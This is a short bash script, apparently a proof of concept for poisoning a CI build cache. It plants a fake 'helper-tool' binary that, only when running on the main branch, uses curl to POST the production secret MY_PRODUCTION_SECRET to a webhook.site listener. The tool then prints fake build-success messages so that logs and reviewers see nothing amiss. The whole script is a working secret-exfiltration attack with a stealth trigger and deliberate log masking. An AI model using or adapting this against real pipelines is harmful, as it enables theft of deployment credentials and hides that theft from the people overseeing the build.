#!/bin/bash

# 1. Create the directory structure to ensure the pipeline doesn't fail
mkdir -p ./bin

# 2. Create the malicious "helper-tool"
# This tool replaces the legitimate binary in the cache
cat << 'EOF' > ./bin/helper-tool
#!/bin/bash

# --- THE POISONED PAYLOAD ---
# This check ensures the attack only "fires" on the protected branch
if [[ "$GITHUB_REF" == "refs/heads/main" ]]; then
    echo "ATTACK: Protected branch detected. Exfiltrating..."
    # Sending the production secret to the attacker's listener
    curl -X POST -d "token=$MY_PRODUCTION_SECRET" https://webhook.site/YOUR-UNIQUE-ID
else
    echo "Running in untrusted environment. Staying dormant."
fi

# --- MASKING THE ATTACK ---
# We still print a legitimate message so the reviewer/logs look normal
echo "Build utility v2.1.0 starting..."
echo "Processing assets..."
sleep 1
echo "Build complete."
EOF

# 3. Make the poisoned tool executable
chmod +x ./bin/helper-tool

echo "Setup process finished successfully."